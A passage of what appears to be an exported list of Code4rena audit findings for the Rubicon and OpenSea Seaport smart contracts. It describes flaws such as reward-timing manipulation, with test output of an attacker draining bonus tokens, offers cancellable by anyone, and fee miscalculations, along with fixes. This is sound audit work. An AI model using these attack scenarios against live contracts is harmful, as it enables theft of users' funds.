sharesWithdrawn/initialTotalSupply`.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87)  ```solidity /// @inheritdoc IBathBuddy /// @dev Added and modified release function. Should be the only callable release function function release(     IERC20 token,     address recipient,     uint256 sharesWithdrawn,     uint256 initialTotalSupply,     uint256 poolFee ) external override {     require(         msg.sender == beneficiary,         \"Caller is not the Bath Token beneficiary of these rewards\"     );     uint256 releasable = vestedAmount(         address(token),         uint64(block.timestamp)     ) - released(address(token));     if (releasable > 0) {         uint256 amount = releasable.mul(sharesWithdrawn).div(             initialTotalSupply         );         uint256 _fee = amount.mul(poolFee).div(10000);          ..SNIP..          uint256 amountWithdrawn = amount.sub(_fee);         token.transfer(recipient, amountWithdrawn);          _erc20Released[address(token)] += amount;         ..SNIP..     } } ```  ## Test Scripts  Following is the test output that demostrate the above scenario:  ```javascript   Contract: Rubicon Exchange and Pools Original Tests     Deployment       \u2713 is deployed (1783ms)     Bath House Initialization of Bath Pair and Bath Tokens       \u2713 Bath House is deployed and initialized (66ms)         new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f       \u2713 WETH Bath Token for WETH asset is deployed and initialized (131ms)       \u2713 Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)       \u2713 Bath Pair is deployed and initialized w/ BathHouse (59ms)         undefined       \u2713 Alice deposit 50 WETH to WETH bathTokens (137ms)         undefined       \u2713 Bob deposit 50 WETH to WETH bathTokens (174ms) bathAssetInstance.bonusTokens.length = 1 bathBuddyInstance (Vesting Wallet) has 1000 DAI bathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788 bathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week) bathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period) 0 DAI has been released from BathBuddy Vesting Wallet Charles has 8500 bathWETH token, 0 DAI, 0 WETH Charles withdraw all his bathWETH tokens 997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet Charles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH Alice has 5 bathWETH token, 0 DAI, 0 WETH 998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet Alice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH       \u2713 Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms) bathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH       \u2713 [Debug] ```  Attacker Charles deposited 8500 WETH to the pool and withdraw them immediately at the final hour, and obtained almost all of the `bonusTokens` (997 DAI). When Alice withdraw from the pool, she only received 0.7 DAI as `bonusTokens`.  Script can be found [https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5](https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5)  Note: Due to some unknown issue with the testing environment, please create a new `BathBuddy.released2` functions to fetch the amount of token already released.  ## Impact  Loss of Fund for the users. BathToken LPs not able to receive the accured `bonusToken` that they are entitled to.  ## Recommended Mitigation Steps  Update the reward mechanism to ensure that the `bonusTokens` are distribute fairly and rewards of each user are accured correctly.  In the above example, since Alice hold 50% of the shares in the pool throughout the majority of the reward period, she should be entitled to close to 50% to the rewards/bonus. Anyone who join the pool at the last hour of the reward period should only be entitled dust amount of `bonusToken`.  Additionally, \"spot\" (or current) share of the pool should not be used to determine the amount of `bonusToken` a user is entitled to as it is vulnerable to pool/share manipulation or flash-loan attack. Checkpointing mechanism should be implemented so that at the minimum, the user's amount of share in the previous block is used for determining the rewards. This make flash-loan attack infeasible as such attack has to happen within the same block/transaction.  For distributing bonus/rewards, I would suggest checking out a widely referenced [Synthetix's Reward](https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol) Contract as I think that it would be more relevant than OZ's Vesting Wallet for this particular purpose.  "}, {"title": "BathToken LPs Unable To Receive Bonus Token Due To Lack Of Wallet Setter Method", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/107", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool\u2019s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that the BathToken LPs are unable to receive any bonus tokens from the BathBuddy Vesting Wallet during withdraw and the bonus tokens are struck in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The following shows that the address of the BathBuddy Vesting Wallet is stored in the `rewardsVestingWallet` state variable and it is used to call the `release` function to distribute bonus to the BathToken withdrawers.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629)  ```solidity function distributeBonusTokenRewards(     address receiver,     uint256 sharesWithdrawn,     uint256 initialTotalSupply ) internal {     if (bonusTokens.length > 0) {         for (uint256 index = 0; index < bonusTokens.length; index++) {             IERC20 token = IERC20(bonusTokens[index]);             // Note: Shares already burned in Bath Token _withdraw              // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they             //  are released their relative share of this pool, of vested BathBuddy rewards             // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens             if (rewardsVestingWallet != IBathBuddy(0)) {                 rewardsVestingWallet.release(                     (token),                     receiver,                     sharesWithdrawn,                     initialTotalSupply,                     feeBPS                 );             }         }     } } ```  However, there is no setter method to initialise the value of the `rewardsVestingWallet` state variable in the contracts. Therefore, the value of `rewardsVestingWallet` will always be zero. Note that Solidity only create a default getter for public state variable, but does not create a default setter.  Since `rewardsVestingWallet` is always zero, the condition `if (rewardsVestingWallet != IBathBuddy(0))` will always be evaluated as `false`. Thus, the code block `rewardsVestingWallet.release` will never be reached.  ## Impact  Loss of Fund for the users. BathToken LPs are not able to receive their `bonusToken`.  ## Recommended Mitigation Steps  Implement a setter method for the `rewardsVestingWallet` state variable in the contracts so that it can be initialised with BathBuddy Vesting Wallet address.  "}, {"title": "Ineffective ReserveRatio Enforcement", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/106", "labels": ["bug", "3 (High Risk)"], "target": "2022-05-rubicon-findings", "body": "Ineffective ReserveRatio Enforcement"}, {"title": "RubiconRouter _swap does not pass whole amount to RubiconMarket", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/104", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L229:#L244   # Vulnerability details  When swapping amongst multiple pairs in RubiconRouter's `_swap`, the fee is wrongly accounted for.  ## Impact Not all of the user's funds would be forwarded to RubinconMarket, therefore the user would lose funds.  ## Proof of Concept The `_swap` function is calculating the pay amount to send to RubiconMarket.sellAllAmount [to be](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L232): ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000) ``` But this would lead to not all of the funds being pulled by RubiconMarket. I mathematically show this in [this image](https://i.ibb.co/J5678C3/c4amountlost.jpg). The correct parameter that needs to be sent to sellAllAmount is: ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000+expectedMarketFeeBPS) ``` I mathematically prove this in [this image](https://i.ibb.co/xHzYfzF/c4newparam.jpg).  ## Recommended Mitigation Steps Change the parameter to the abovementioned one.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/103", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/102", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "USDT is not supported because of approval mechanism", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/100", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256   # Vulnerability details  When using the approval mechanism in USDT, the approval must be set to 0 before it is updated. In Rubicon, when creating a pair, the paired asset's approval is not set to 0 before it is updated.  ## Impact Can't create pairs with USDT, the most popular stablecoin, as as the approval will revert.  ## Proof of Concept [USDT](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code) reverts on approval if previous allowance is not 0: ``` require(!((_value != 0) && (allowed[msg.sender][_spender] != 0))); ``` When creating a pair, Rubicon [approves](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180) the paired asset without first setting it to 0: ``` desiredPairedAsset.approve(pairedPool, initialLiquidityExistingBathToken); ``` Therefore, if desiredPairedAsset is USDT, the function will revert, and pairs with USDT can not be created.  This problem will also manifest in RubiconMarket's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157) and BathToken's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256),   ## Recommended Mitigation Steps Set the allowance to 0 before setting it to the new value.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/99", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/95", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "User will loose funds", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/87", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-05-rubicon-findings", "body": "User will loose funds"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/85", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/84", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/83", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Use `call()` instead of `transfer()` when transferring ETH in RubiconRouter", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/82", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L356 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L374 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L434 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L451 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L491 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L548   # Vulnerability details  ## Impact When transferring ETH, use `call()` instead of `transfer()`.  The `transfer()` function only allows the recipient to use 2300 gas. If the recipient uses more than that, transfers will fail. In the future gas costs might change increasing the likelihood of that happening.  Keep in mind that `call()` introduces the risk of reentrancy. But, as long as the router follows the checks effects interactions pattern it should be fine. It's not supposed to hold any tokens anyway.  ## Proof of Concept See the linked code snippets above.  ## Tools Used none  ## Recommended Mitigation Steps Replace `transfer()` calls with `call()`. Keep in mind to check whether the call was successful by validating the return value:  ```sol (bool success, ) = msg.sender.call{value: amount}(\"\"); require(success, \"Transfer failed.\") ```  "}, {"title": "BathBuddy locks up Ether it receives", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/78", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69   # Vulnerability details  ## Impact The BathBuddy contract is able to receive ETH. But, there's no way of ever retrieving that ETH from the contract. The funds will be locked up.  Currently, there seems to be no logic in the protocol where ETH is sent to the contract. But, it might happen in the future. So I'd say it's a MED issue.  ## Proof of Concept `receive()`  function: https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69  ## Tools Used none  ## Recommended Mitigation Steps Remove the `receive()` function if the contract isn't supposed to handle ETH. Otherwise, add the necessary logic to release the ETH it gets.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/75", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/68", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "No Storage Gap for Upgradeable Contracts", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/67", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L525-L535   # Vulnerability details  ## Impact  For upgradeable contracts, there must be storage gap to \"allow developers to freely add new state variables in the future without compromising the storage compatibility with existing deployments\". Otherwise it may be very difficult to write new implementation code. Without storage gap, the variable in child contract might be overwritten by the upgraded base contract if new variables are added to the base contract. This could have unintended and very serious consequences to the child contracts.  Refer to the bottom part of this article: https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable  ## Proof of Concept  As an example, the `ExpiringMarket` contract inherits `SimpleMarket`, and the `SimpleMarket` contract does not contain any storage gap. If in a future upgrade, an additional variable is added to the `SimpleMarket` contract, that new variable will overwrite the storage slot of the `stopped` variable in the `ExpiringMarket` contract, causing unintended consequences.   https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449  Similarly, the `ExpiringMarket` does not contain any storage gap either, and the `RubiconMarket` contract inherits `ExpiringMarket`. If a new variable is added to the `ExpiringMarket` contract in an upgrade, that variable will overwrite the `buyEnabled` variable in `ExpiringMarket` contract.   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates.  ```solidity uint256[50] private __gap; ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/66", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/56", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/55", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "RubiconRouter.swapEntireBalance() doesn't handle the slippage check properly", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/52", "labels": ["bug", "3 (High Risk)"], "target": "2022-05-rubicon-findings", "body": "RubiconRouter.swapEntireBalance() doesn't handle the slippage check properly"}, {"title": "Strategist can transfer user funds to themselves", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/51", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Strategist can transfer user funds to themselves"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/50", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/49", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Centralized risks allows rogue pool behavior in BathToken.", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/43", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Centralized risks allows rogue pool behavior in BathToken."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Wrong DOMAIN_SEPARATOR", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/38", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210   # Vulnerability details  ## Impact The `DOMAIN_SEPARATOR` is wrong calculated.  ## Proof of Concept  In the `initialize` method of the `BathToken` contract, the `name` of the contract is used to calculate the `DOMAIN_SEPARATOR`, however said name is set later, so it will use an incorrect `name`, making it impossible to calculate the `DOMAIN_SEPARATOR` correctly.  ```javascript DOMAIN_SEPARATOR = keccak256(     abi.encode(         keccak256(             \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"         ),         keccak256(bytes(name)),         keccak256(bytes(\"1\")),         chainId,         address(this)     ) ); name = string(abi.encodePacked(_symbol, (\" v1\"))); ```  Affected source code: - [BathToken.sol#L199-L210](https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210)  ## Recommended Mitigation Steps - Set the `name` before use it.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/35", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/27", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/26", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "BathPair initialization can be front run by malicious actor", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/24", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "BathPair initialization can be front run by malicious actor"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/22", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "No cap on fees can result in a DOS in BathToken.withdraw()", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "No cap on fees can result in a DOS in BathToken.withdraw()"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/20", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "RubiconRouter: Offers created through offerForETH cannot be cancelled", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/18", "labels": ["bug", "3 (High Risk)"], "target": "2022-05-rubicon-findings", "body": "RubiconRouter: Offers created through offerForETH cannot be cancelled"}, {"title": "RubiconRouter: Offers created through offerWithETH() can be cancelled by anyone", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/17", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409   # Vulnerability details  ## Impact When a user creates an offer through the offerWithETH function of the RubiconRouter contract, the offer function of the RubiconMarket contract is called, and the RubiconRouter contract address is set to offer.owner in the offer function. This means that anyone can call the cancelForETH function of the RubiconRouter contract to cancel the offer and get the ether. ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L440-L452 ## Tools Used None ## Recommended Mitigation Steps Set the owner of offer_id to msg.sender in offerWithETH function and check it in cancelForETH function  "}, {"title": "RubiconRouter: Excess ether did not return to the user", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/15", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339   # Vulnerability details  ## Impact In  swapWithETH/buyAllAmountWithETH/offerWithETH/depositWithETH functions of the RubiconRouter contract, when msg.value > max_fill_withFee/pay_amt/amount/amtWithFee, the excess ether will not be returned to the user.  ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L393 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L455-L462 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L494-L507 ## Tools Used None ## Recommended Mitigation Steps Return excess ether to msg.sender, or require msg.value == max_fill_withFee/pay_amt/amount/amtWithFee  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/9", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/8", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/4", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "setBathHouseAdmin() could accidentally set address(0) as the new admin.", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/1", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "setBathHouseAdmin() could accidentally set address(0) as the new admin."}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/215", "labels": [], "target": "2022-05-opensea-seaport-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/213", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/212", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/210", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/209", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/208", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/204", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/203", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/202", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/199", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/194", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/193", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/192", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/191", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/189", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/188", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/181", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/178", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/175", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/174", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Merkle Tree criteria can be resolved by wrong tokenIDs", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L157   # Vulnerability details  ## Impact The protocol allows specifying several tokenIds to accept for a single offer. A merkle tree is created out of these tokenIds and the root is stored as the `identifierOrCriteria` for the item. The fulfiller then submits the actual tokenId and a proof that this tokenId is part of the merkle tree.  